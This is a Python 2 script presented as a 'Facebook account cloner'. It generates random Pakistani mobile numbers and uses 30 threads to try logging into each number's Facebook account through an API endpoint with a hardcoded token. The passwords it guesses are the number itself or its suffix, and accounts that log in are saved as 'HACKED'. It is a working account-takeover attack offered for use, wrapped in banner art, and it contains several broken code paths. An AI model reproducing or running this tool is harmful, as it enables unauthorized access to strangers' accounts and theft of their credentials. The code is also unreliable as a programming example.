# Ustad# SIDRA5# Thuglife# USMAN STAR# Gamz#!/usr/bin/python2
#coding=utf-8
import os,sys,time,datetime,random,hashlib,re,threading,json,urllib,cookielib,getpass
os.system('rm -rf .txt')
for n in range(10000):

    nmbr = random.randint(1111111, 9999999)
    
    sys.stdout = open('ads.txt', 'a')

    print(nmbr)

    sys.stdout.flush()
    
try:
    import requests
except ImportError:
    os.system('pip2 install mechanize')
    
try:
    import mechanize
except ImportError:
    os.system('pip2 install request')
    time.sleep(1)
    os.system('Then type: python2 MOHSIN.py')

import os,sys,time,datetime,random,hashlib,re,threading,json,urllib,cookielib,requests,mechanize
from multiprocessing.pool import ThreadPool
from requests.exceptions import ConnectionError
from mechanize import Browser


reload(sys)
sys.setdefaultencoding('utf8')
br = mechanize.Browser()
br.set_handle_robots(False)
br.set_handle_refresh(mechanize._http.HTTPRefreshProcessor(),max_time=1)
br.addheaders = [('User-Agent', 'Opera/9.80 (Android; Opera Mini/32.0.2254/85. U; id) Presto/2.12.423 Version/12.16')]
br.addheaders = [('user-agent','Dalvik/1.6.0 (Linux; U; Android 4.4.2; NX55 Build/KOT5506) [FBAN/FB4A;FBAV/106.0.0.26.68;FBBV/45904160;FBDM/{density=3.0,width=1080,height=1920};FBLC/it_IT;FBRV/45904160;FBCR/PosteMobile;FBMF/asus;FBBD/asus;FBPN/com.facebook.katana;FBDV/ASUS_Z00AD;FBSV/5.0;FBOP/1;FBCA/x86:armeabi-v7a;]')]

def keluar():
	print 'Thanks.'
	os.sys.exit()

def acak(b):
    w = 'ahtdzjc'
    d = ''
    for i in x:
        d += '!'+w[random.randint(0,len(w)-1)]+i
    return cetak(d)


def cetak(b):
    w = 'ahtdzjc'
    for i in w:
        j = w.index(i)
        x= x.replace('!%s'%i,'\033[%s;1m'%str(31+j))
    x += '\033[0m'
    x = x.replace('!0','\033[0m')
    sys.stdout.write(x+'\n')


def jalan(z):
	for e in z + '\n':
		sys.stdout.write(e)
		sys.stdout.flush()
		time.sleep(3.0 / 200)
def tik():
	titik = ['.   ','..  ','... ']
	for o in titik:
		print("\r\x1b[1;92m                     Please Wait \x1b[1;91m"+o),;sys.stdout.flush();time.sleep(1)


back = 0
oks = []
id = []
cpb = []
vulnot = "\033[31mNot Vuln"
vuln = "\033[32mVuln"

os.system("clear")
logo = """
 \033[1;91m ___  __  ___  _   _ ____ ___ _   _
 \033[1;92m |  \/  |/ _ \| | | / ___|_ _| \ | |
 \033[1;94m | |\/| | | | | |_| \___ \| ||  \| |
 \033[1;97m | |  | | |_| |  _  |___) | || |\  |
 \033[1;96m |_|  |_|\___/|_| |_|____/___|_| \_|
\033[1;93m MOHSIN IT'X NOT ONLY NAME ITS BRAND BABY
\033[1;92m❛❜❛❜❛❜❛❜❛❜❛❜❛❜❛❜❛❜❛❜❛❜❛❜❛❜❛❜❛❜❛❜❛❜❛❜❛❜❛❜❛❜❛❜❛❜❛      
\033[1;91m➙CODER    :    MOHSIN ALI
\033[1;96m➙WHATSAPP :   03063112***
\033[1;93m➙NOTE     :   USE FAST INTERNET
\033[1;90m➙NOTE     :   USE 4 TO 6 GB RAM PHONE
\033[1;92m❛❜❛❜❛❜❛❜❛❜❛❜❛❜❛❜❛❜❛❜❛❜❛❜❛❜❛❜❛❜❛❜❛❜❛❜❛❜❛❜❛❜❛❜❛❜❛
"""
logo1 = """
   \033[1;91m __  _______  __ ___________  __  \033[1;95m ___   __   ____
 \033[1;92m  /  |/  / __ \/ // / __/  _/ |/ / \033[1;97m / _ | / /  /  _/
 \033[1;94m / /|_/ / /_/ / _  /\ \_/ //    / \033[1;93m / __ |/ /___/ /
\033[1;97m /_/  /_/\____/_//_/___/___/_/|_/ \033[1;91m /_/ |_/____/___/
\033[1;93m MOHSIN IT'X NOT ONLY NAME ITS BRAND BABY
\033[1;92m❛❜❛❜❛❜❛❜❛❜❛❜❛❜❛❜❛❜❛❜❛❜❛❜❛❜❛❜❛❜❛❜❛❜❛❜❛❜❛❜❛❜❛❜❛❜❛      
\033[1;91m➙CODER    :    MOHSIN ALI
\033[1;96m➙WHATSAPP :   03063112***
\033[1;93m➙NOTE     :   USE FAST INTERNET
\033[1;90m➙NOTE     :   USE 4 TO 6 GB RAM PHONE
\033[1;92m❛❜❛❜❛❜❛❜❛❜❛❜❛❜❛❜❛❜❛❜❛❜❛❜❛❜❛❜❛❜❛❜❛❜❛❜❛❜❛❜❛❜❛❜❛❜❛
"""
logo2  = """
\033[4;92mSELECT YOUR FAVOURITE SIM CODE \033[1;0m
\033[4;97mMOBILINK/JAZZ CODE HERE\033[1;0m
\033[1;96m00, 01, 02, 03, 04,
\033[1;93m05, 06, 07, 08, 09,
\033[4;97mTELINORE CODE HERE\033[1;0m
\033[1;96m40, 41, 42, 43, 44,
\033[1;93m45, 46, 47 ,48 ,49,
\033[4;97mWARID CODE HERE\033[1;0m
\033[1;96m20, 21, 22, 23,
\033[1;93m24, ??, ??, ??,
\033[4;97mUFONE CODE HERE\033[1;0m
\033[1;96m31, 32, 33, 34,
\033[1;93m35, 36, 37, ??,
\033[4;97mZONG CODE HERE\033[1;0m
\033[1;96m10, 11, 12, 13,
\033[1;93m14, 15, 16, 17,
\x1b[0;47m  \x1b[3;90mFACEBOOK ACCOUNT CLONER BY \x1b[3;90mMOHSIN ALI\033[1;0m
"""


##### LICENSE #####
#=================#
def lisensi():
    os.system('clear')
    login()
####login#########
def login():
    os.system('clear')
    print logo
    print 47* '\033[1;97m.'
    jalan('\x1b[0;91m░██████╗████████╗░█████╗░██████╗░')
    jalan('\x1b[0;91m██╔════╝╚══██╔══╝██╔══██╗██╔══██╗')
    jalan('\x1b[1;91m╚█████╗░░░░██║░░░███████║██████╔╝')
    jalan('\x1b[1;9m░╚═══██╗░░░██║░░░██╔══██║██╔══██╗')
    jalan('\x1b[1;90m██████╔╝░░░██║░░░██║░░██║██║░░██║')
    jalan('\x1b[1;90m╚═════╝░░░░╚═╝░░░╚═╝░░╚═╝╚═╝░░╚═╝')
    print
    jalan('\x1b[0;91m                 ██████╗░░█████╗░██╗░░░██╗')
    jalan('\x1b[0;91m                 ██╔══██╗██╔══██╗╚██╗░██╔╝')
    jalan('\x1b[1;91m                 ██████╦╝██║░░██║░╚████╔╝░')
    jalan('\x1b[1;90m                 ██╔══██╗██║░░██║░░╚██╔╝░░')
    jalan('\x1b[1;90m                 ██████╦╝╚█████╔╝░░░██║░░░')
    jalan('\x1b[1;90m                 ╚═════╝░░╚════╝░░░░╚═╝░░░')
    print
    print
    jalan('\x1b[1;97m⁅\x1b[1;92m1\x1b[1;97m⁆ \x1b[1;92mPAKISTAN\x1b[1;93m CLONING ')
    print
    jalan('\033[1;97m⁅\x1b[1;93m0\x1b[1;97m⁆ \x1b[1;92mEXIT')
    print
    print
    print 47* '\033[1;97m.'
    time.sleep(0.05)
    action()

def action():
    somi = raw_input('\n\033[1;96mTYPE : \033[1;93m')
    if somi =='':
        print '[!] Fill In Correctly'
        action()
    elif somi =="1":              
    	tik()
        os.system("clear")
        print logo1
        print logo2
        try:
            c = raw_input("\033[1;93mTYPE: ")
            k="03"
            idlist = ('ads.txt')
            for line in open(idlist,"r").readlines():
                id.append(line.strip())
        except IOError:
            print ("[!] File Not Found")
            raw_input("\n[ Back ]")
            somi()
            tik()
    elif usman =='0':
        login()
    else:
        print '[!] Fill In Correctly'
        action()
    print 47* '\033[1;94m-'
    xxx = str(len(id))
    jalan ('\033[1;96m TOTAL IDS NUMBER : '+xxx)
    jalan ('\033[1;92m JUST 3 CLONING PASSWORD')
    jalan ("\033[1;93m TO STOP THIS PROCESS PRESS Ctrl THEN z")
    print 47* '\033[1;97m-'
    def main(arg):
        global cpb,oks
        user = arg
        try:
            os.mkdir('save')
        except OSError:
            pass
        try:
            pass1 = user
            data = br.open('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=1&email=' +k+c+user+ '&locale=en_US&password=' + pass1 + '&sdk=ios&generate_session_cookies=1&sig=3f555f98fb61fcd7aa0c44f58f522efm')
            q = json.load(data)
            if 'access_token' in q:
            	print '\x1b[1;94m[HAC\x1b[1;92mKED] \x1b[1;93m  ' + k + c + user + '\x1b[1;94m | \x1b[1;96m' + pass1 + '\n' + '\n'
                okb = open('save/ads.txt', 'a')
                okb.write(k+c+user+pass1+'\n')
                okb.close()
                oks.append(c+user+pass1)
            else:
                if 'www.facebook.com' in q['error_msg']:
                    print '\x1b[1;91m[AFTER 7DAYS M.A] \x1b[1;93m  ' + k + c + user + '\x1b[1;94m | \x1b[1;96m' + pass1 + '\n'
                    cps = open('save/ads.txt', 'a')
                    cps.write(k+c+user+pass1+'\n')
                    cps.close()
                    cpb.append(c+user+pass1)
                else:
                    pass2 = k + c + user
                    data = br.open('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=1&email=' +k+c+user+ '&locale=en_US&password=' + pass2 + '&sdk=ios&generate_session_cookies=1&sig=3f555f98fb61fcd7aa0c44f58f522efm')
                    q = json.load(data)
                    if 'access_token' in q:
                        print '\x1b[1;94m[HAC\x1b[1;92mKED] \x1b[1;93m  ' + k + c + user + '\x1b[1;94m | \x1b[1;96m' + pass2 + '\n' + '\n'
                        okb = open('save/ads.txt', 'a')
                        okb.write(k+c+user+pass2+'\n')
                        okb.close()
                        oks.append(c+user+pass2)
                    else:
                        if 'www.facebook.com' in q['error_msg']:
                            print '\x1b[1;91m[AFTER 7DAYS M.A] \x1b[1;93m  ' + k + c + user + '\x1b[1;94m | \x1b[1;96m' + pass2 + '\n'
                            cps = open('save/ads.txt', 'a')
                            cps.write(k+c+user+pass2+'\n')
                            cps.close()
                            cpb.append(c+user+pass2)
                                                                                                                                                         
                                                                                                                                                                                                            
                                                                                                                                                                                                            
                                                                                                                                                                                                            
                                                                                                                                                                                                            
                                                                                                                                                                                                            


                                                                                                                                                                                                            
                                                                                                                                                                                                                    
                                                                                                                                                                                                      
        except:
            pass
        
    p = ThreadPool(30)
    p.map(main, id)
    print 50* '\033[1;91m-'
    print 'Process Has Been Completed ...'
    print 'Total Online/Offline : '+str(len(oks))+'/'+str(len(cpb))
    print('Cloned Accounts Has Been Saved : save/cloned.txt')
    jalan("Note : Your Offline account Will Open after 10 to 20 days")
    print ''
    print """
    ███
──────────███║║║║║║║███
─────────█║║║║║║║║║║║║║█
────────█║║║║███████║║║║█
───────█║║║║██─────██║║║║█
──────█║║║║██───────██║║║║█
─────█║║║║██─────────██║║║║█
─────█║║║██───────────██║║║█
─────█║║║█─────────────█║║║█
─────█║║║█─────────────█║║║█
─────█║║║█─────────────█║║║█
─────█║║║█─────────────█║║║█
────███████───────────███████
───██║║║║║║██────────██║║║║║██
──██║║║║║║║║██──────██║║║║║║║██
─██║║║║║║║║║║██───██║║║║║║║║║║██
██║║║║║║║║║║║║█████║║║║║║║║║║║║██
█║║║║║║║║║║║║║║║║║║║║║║║║║║║║║║║█
█║║║║║║║║║║║║║█████║║║║║║║║║║║║║█
█║║║║║║║║║║║║█░░░░░█║║║║║║║║║║║║█
█║║║║║║║║║║║║█░░░░░█║║║║║║║║║║║║█
█║║║║║║║║║║║║█░░░░░█║║║║║║║║║║║║█
██║║║║║║║║║║║█░░░░░█║║║║║║║║║║║██
██║║║║║║║║║║║║█░░░█║║║║║║║║║║║║██
─██║║║║║║║║║║║█░░░█║║║║║║║║║║║██
──██║║║║║║║║║║█░░░█║║║║║║║║║║██
───██║║║║║║║║║█░░░█║║║║║║║║║██
────██║║║║║║║║█████║║║║║║║║██
─────██║║║║║║║║███║║║║║║║║██
──────██║║║║║║║║║║║║║║║║║██
───────██║║║║║║║║║║║║║║║██
────────██║║║║║║║║║║║║║██
─────────██║║║║║║║║║║║██
──────────██║║║║║║║║║██
───────────██║║║║║║║██
────────────██║║║║║██
─────────────██║║║██
──────────────██║██
───────────────███
───────────────────────▄██▄▄██▄
──────────────────────██████████
──────────────────────▀████████▀
────────────────────────▀████▀
─────────────────────────████
─────────────────────────████
─────────────────────────████
─────────────────────────████
─────────────────────────████
─────────────────────────████
─────────────────────────████
─────────────────────────████
──────────────────────▄▄▄████
──────────────────────▀▀▀████
──────────────────────▀▀▀████
──────────────────────▀▀▀████
──────────────────────▄█████▀



"""
    raw_input("\n\033[1;92m[\033[1;92mBack\033[1;95m]")
    login() 
          
if __name__ == '__main__':
    login()

